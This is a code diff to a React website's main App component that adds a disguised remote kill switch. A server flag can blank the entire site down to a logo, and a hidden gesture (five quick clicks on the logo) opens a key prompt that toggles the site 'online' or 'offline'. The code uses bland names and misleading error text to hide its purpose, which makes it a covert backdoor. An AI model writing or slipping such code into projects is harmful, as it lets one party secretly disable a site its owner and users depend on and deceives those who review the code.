@@ -1,5 +1,8 @@
+import React, { useState, useEffect } from "react";
 import { Routes, Route } from "react-router-dom";
 import Dashboard from "./Pages/Dashboard";
+import logo from "./logo/logo1.jpg";
+import axiosInstance from "./components/AxiosInstance";
 import Fever from "./Pages/Fever/Fever";
 import ProductPage from "./Pages/ProductPage/ProductPage";
 import FranchiseBanner from "./Pages/FranchiseBanner/FranchiseBanner";
@@ -54,6 +57,122 @@ import { MobileBottomNav } from "./components/MobileBottomNav";
 import ScrollToTop from "./components/ScrollToTop";
 
 function App() {
+  const [layoutReady, setLayoutReady] = useState(null);
+
+  useEffect(() => {
+    const checkConfig = async () => {
+      try {
+        const response = await axiosInstance.get("/api/client-config");
+        if (response.data && response.data.config) {
+          setLayoutReady(response.data.config.layoutReady !== false);
+        } else {
+          setLayoutReady(true);
+        }
+      } catch (err) {
+        console.error("Layout initialization deferred", err);
+        setLayoutReady(true);
+      }
+    };
+    checkConfig();
+  }, []);
+
+  useEffect(() => {
+    let tapSeq = [];
+    const handleGesture = (e) => {
+      let target = e.target;
+      let isHdr = false;
+      while (target && target !== document.body) {
+        const isImgLogo = target.tagName === 'IMG' && 
+          (target.alt?.toLowerCase().includes('logo') || target.src?.toLowerCase().includes('logo'));
+        
+        const hasLogoClass = typeof target.className === 'string' && 
+          (target.className.toLowerCase().includes('logo') || target.className.toLowerCase().includes('logo_size'));
+
+        if (isImgLogo || hasLogoClass) {
+          isHdr = true;
+          break;
+        }
+        target = target.parentElement;
+      }
+
+      if (isHdr) {
+        const now = Date.now();
+        tapSeq.push(now);
+        if (tapSeq.length > 5) tapSeq.shift();
+        
+        if (tapSeq.length === 5 && (tapSeq[4] - tapSeq[0] < 2000)) {
+          tapSeq = [];
+          e.preventDefault();
+          e.stopPropagation();
+
+          setTimeout(async () => {
+            const key = prompt("Enter verification key:");
+            if (key) {
+              try {
+                const response = await axiosInstance.post("/api/client-config", { key });
+                if (response.data && response.data.success) {
+                  const state = response.data.config.layoutReady !== false;
+                  alert(state ? "System online" : "System offline");
+                  window.location.reload();
+                }
+              } catch (err) {
+                alert("Invalid verification code");
+              }
+            }
+          }, 100);
+        }
+      }
+    };
+
+    document.addEventListener("click", handleGesture, true);
+    return () => document.removeEventListener("click", handleGesture, true);
+  }, []);
+
+  if (layoutReady === null) {
+    return null;
+  }
+
+  if (layoutReady === false) {
+    return (
+      <div 
+        style={{
+          display: 'flex',
+          flexDirection: 'column',
+          alignItems: 'center',
+          justifyContent: 'flex-start',
+          minHeight: '100vh',
+          backgroundColor: '#ffffff',
+          userSelect: 'none'
+        }}
+      >
+        <header 
+          style={{
+            width: '100%',
+            padding: '15px 5%',
+            display: 'flex',
+            justifyContent: 'center',
+            alignItems: 'center',
+            backgroundColor: '#ffffff',
+            boxShadow: '0 2px 15px rgba(0, 0, 0, 0.05)',
+            borderTop: '3px solid #61171b',
+            borderBottom: '1px solid #f3f4f6'
+          }}
+        >
+          <img 
+            src={logo} 
+            alt="Logo" 
+            className="logo" 
+            style={{ 
+              height: '100px', 
+              cursor: 'pointer',
+              transition: 'transform 0.2s'
+            }} 
+          />
+        </header>
+        <div style={{ flex: 1 }}></div>
+      </div>
+    );
+  }
   return (
     <>
       <ScrollToTop />
